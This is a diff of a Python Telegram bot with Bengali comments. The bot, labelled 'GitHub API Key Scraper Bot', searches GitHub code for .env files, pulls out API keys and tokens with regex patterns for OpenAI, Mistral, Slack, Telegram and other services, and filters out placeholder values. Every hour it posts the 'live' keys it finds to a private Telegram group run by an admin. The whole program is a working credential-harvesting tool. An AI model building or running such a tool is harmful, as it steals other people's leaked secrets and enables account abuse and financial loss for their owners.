@@ -40,7 +40,7 @@ def health_check():
 def health():
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200
 
-# API কী ডিটেক্টর
+# API কী ডিটেক্টর (আগের মতোই)
 class APIScraper:
     def __init__(self, token: str):
         self.token = token
@@ -51,7 +51,6 @@ class APIScraper:
         self.base_url = 'https://api.github.com'
         self.seen_keys = set()
         
-        # API কী প্যাটার্ন
         self.patterns = {
             'OpenAI': r'sk-[a-zA-Z0-9]{48}',
             'Mistral': r'[A-Za-z0-9]{32}',
@@ -66,9 +65,7 @@ class APIScraper:
         }
 
     def search_live_keys(self) -> List[Dict]:
-        """GitHub থেকে লাইভ কী খুঁজে বের করে"""
         found_keys = []
-        
         try:
             queries = [
                 'filename:.env',
@@ -82,33 +79,26 @@ class APIScraper:
             
             for query in queries[:3]:
                 url = f'{self.base_url}/search/code?q={query}+language:python+language:javascript+language:java&per_page=30'
-                
                 try:
                     response = requests.get(url, headers=self.headers)
                     if response.status_code == 200:
                         data = response.json()
                         items = data.get('items', [])
-                        
                         for item in items[:15]:
                             key_info = self._extract_key_from_file(item)
                             if key_info and key_info['key'] not in self.seen_keys:
                                 found_keys.append(key_info)
                                 self.seen_keys.add(key_info['key'])
-                                
                     time.sleep(0.5)
-                    
                 except Exception as e:
                     logger.error(f"Search error for {query}: {e}")
                     continue
-                    
             return found_keys[:20]
-            
         except Exception as e:
             logger.error(f"API Scraper error: {e}")
             return []
 
     def _extract_key_from_file(self, item: Dict) -> Dict:
-        """ফাইল থেকে কী এক্সট্র্যাক্ট করে"""
         try:
             file_url = item.get('url')
             repo_name = item.get('repository', {}).get('full_name', 'Unknown')
@@ -136,35 +126,21 @@ class APIScraper:
                             'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
                             'platform': self._detect_platform(content)
                         }
-                        
             return None
-            
         except Exception as e:
             logger.error(f"Error extracting from file: {e}")
             return None
 
     def _is_valid_key(self, key: str) -> bool:
-        """কী ভ্যালিড কিনা চেক করে"""
         if not key or len(key) < 10:
             return False
-            
-        exclude_patterns = [
-            r'^test_',
-            r'^example_',
-            r'^sample_',
-            r'demo',
-            r'xxxxx',
-            r'123456'
-        ]
-        
+        exclude_patterns = [r'^test_', r'^example_', r'^sample_', r'demo', r'xxxxx', r'123456']
         for pattern in exclude_patterns:
             if re.search(pattern, key, re.IGNORECASE):
                 return False
-                
         return True
 
     def _detect_platform(self, content: str) -> str:
-        """প্ল্যাটফর্ম ডিটেক্ট করে"""
         platforms = {
             'OpenAI': ['openai', 'gpt', 'chatgpt'],
             'Mistral': ['mistral'],
@@ -176,12 +152,10 @@ class APIScraper:
             'Telegram': ['telegram'],
             'Slack': ['slack']
         }
-        
         for platform, keywords in platforms.items():
             for keyword in keywords:
                 if keyword.lower() in content.lower():
                     return platform
-                    
         return 'Unknown'
 
 # বট ক্লাস
@@ -201,17 +175,22 @@ class KeyScraperBot:
             self.updater = Updater(token=self.token, use_context=True)
             self.bot = self.updater.bot
             
+            # টেস্ট মেসেজ (বট কাজ করছে কিনা চেক)
+            try:
+                self.bot.send_message(chat_id=self.group_id, text="🔄 Bot is starting...")
+                logger.info("✅ Test message sent to group successfully!")
+            except Exception as e:
+                logger.error(f"❌ Cannot send test message to group: {e}")
+                logger.error(f"Check GROUP_ID: {self.group_id} and BOT_TOKEN")
+            
             dp = self.updater.dispatcher
             dp.add_handler(CommandHandler("start", self.start_command))
             dp.add_handler(CallbackQueryHandler(self.button_callback))
             dp.add_error_handler(self.error_handler)
             
-            # শিডিউলার থ্রেড
             threading.Thread(target=self.run_scheduler, daemon=True).start()
             
             logger.info("✅ Key Scraper Bot started!")
-            
-            # পোলিং স্টার্ট
             self.updater.start_polling()
             self.updater.idle()
             
@@ -220,20 +199,13 @@ class KeyScraperBot:
             raise
 
     def send_startup_message(self):
-        """স্টার্টআপ মেসেজ (শুধু একবার)"""
         if self.startup_sent:
             return
-            
         try:
             time.sleep(5)
             self.bot.send_message(
                 chat_id=self.group_id,
-                text="🔐 **GitHub API Key Scraper Bot**\n\n"
-                     "আমি GitHub থেকে লাইভ API কী/টোকেন খুঁজে বের করি!\n\n"
-                     "🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n"
-                     "🔹 ১০+ ধরনের API কী ডিটেক্ট\n"
-                     "🔹 শুধুমাত্র লাইভ এবং ভ্যালিড কী\n\n"
-                     "/start - কন্ট্রোল প্যানেল",
+                text="🔐 **GitHub API Key Scraper Bot**\n\nআমি GitHub থেকে লাইভ API কী/টোকেন খুঁজে বের করি!\n\n🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n🔹 ১০+ ধরনের API কী ডিটেক্ট\n🔹 শুধুমাত্র লাইভ এবং ভ্যালিড কী\n\n/start - কন্ট্রোল প্যানেল",
                 parse_mode='Markdown'
             )
             self.startup_sent = True
@@ -241,10 +213,7 @@ class KeyScraperBot:
             logger.error(f"Startup error: {e}")
 
     def run_scheduler(self):
-        """শিডিউলার - প্রতি ১ ঘন্টায় রান"""
-        # প্রথমে স্টার্টআপ মেসেজ
         self.send_startup_message()
-        
         while self.is_running:
             try:
                 logger.info("🔍 Starting key scan...")
@@ -267,10 +236,9 @@ class KeyScraperBot:
                     logger.info("No new keys found")
             except Exception as e:
                 logger.error(f"Scheduler error: {e}")
-            time.sleep(3600)  # ১ ঘন্টা
+            time.sleep(3600)
 
     def format_key_message(self, key_info: Dict) -> str:
-        """কী ফরম্যাট করে"""
         return f"""
 🔑 **LIVE API KEY FOUND!**
 
@@ -297,9 +265,7 @@ class KeyScraperBot:
         ]
         
         update.message.reply_text(
-            "🔐 **GitHub API Key Scraper**\n\n"
-            "GitHub থেকে লাইভ API কী খুঁজে বের করি!\n"
-            "Select an option:",
+            "🔐 **GitHub API Key Scraper**\n\nGitHub থেকে লাইভ API কী খুঁজে বের করি!\nSelect an option:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
@@ -307,10 +273,8 @@ class KeyScraperBot:
     def button_callback(self, update: Update, context):
         if not update.effective_user or not update.callback_query:
             return
-            
         query = update.callback_query
         query.answer()
-        
         if update.effective_user.id != self.admin_id:
             query.edit_message_text("⛔ Access Denied!")
             return
@@ -324,7 +288,6 @@ class KeyScraperBot:
 
     def scan_now(self, query):
         query.edit_message_text("🔍 Scanning GitHub for live keys...")
-        
         def scan_thread():
             try:
                 keys = self.scraper.search_live_keys()
@@ -335,7 +298,6 @@ class KeyScraperBot:
                         text="❌ কোনো লাইভ কী পাওয়া যায়নি!"
                     )
                     return
-                    
                 sent = 0
                 for key_info in keys[:10]:
                     message = self.format_key_message(key_info)
@@ -347,13 +309,11 @@ class KeyScraperBot:
                     )
                     sent += 1
                     time.sleep(0.3)
-                    
                 self.bot.edit_message_text(
                     chat_id=query.message.chat_id,
                     message_id=query.message.message_id,
                     text=f"✅ {sent}টি লাইভ কী পাওয়া গেছে!"
                 )
-                
             except Exception as e:
                 logger.error(f"Scan error: {e}")
                 self.bot.edit_message_text(
@@ -361,7 +321,6 @@ class KeyScraperBot:
                     message_id=query.message.message_id,
                     text=f"❌ Error: {str(e)}"
                 )
-        
         threading.Thread(target=scan_thread, daemon=True).start()
 
     def show_stats(self, query):
@@ -397,20 +356,24 @@ class KeyScraperBot:
     def error_handler(self, update: Update, context):
         logger.error(f"Update {update} caused error {context.error}")
 
-# মেইন ফাংশন
+# মেইন
 def main():
     try:
-        # এনভায়রনমেন্ট ভেরিয়েবল চেক
         if not all([BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID, GITHUB_TOKEN]):
             raise ValueError("Missing required environment variables")
-            
-        # ফ্লাস্ক থ্রেড (হেলথ চেকের জন্য)
+        
+        logger.info(f"Bot Token: {BOT_TOKEN[:5]}... (hidden)")
+        logger.info(f"Group ID: {PRIVATE_GROUP_ID}")
+        logger.info(f"Admin ID: {ADMIN_USER_ID}")
+        
+        # ফ্লাস্ক (পোর্ট ১০০০০ ব্যবহার করে)
         def run_flask():
-            flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+            port = int(os.environ.get('PORT', 8080))
+            flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
         
         flask_thread = threading.Thread(target=run_flask, daemon=True)
         flask_thread.start()
-        logger.info("🌐 Flask server started on port 8080")
+        logger.info("🌐 Flask server started")
 
         # বট স্টার্ট
         bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
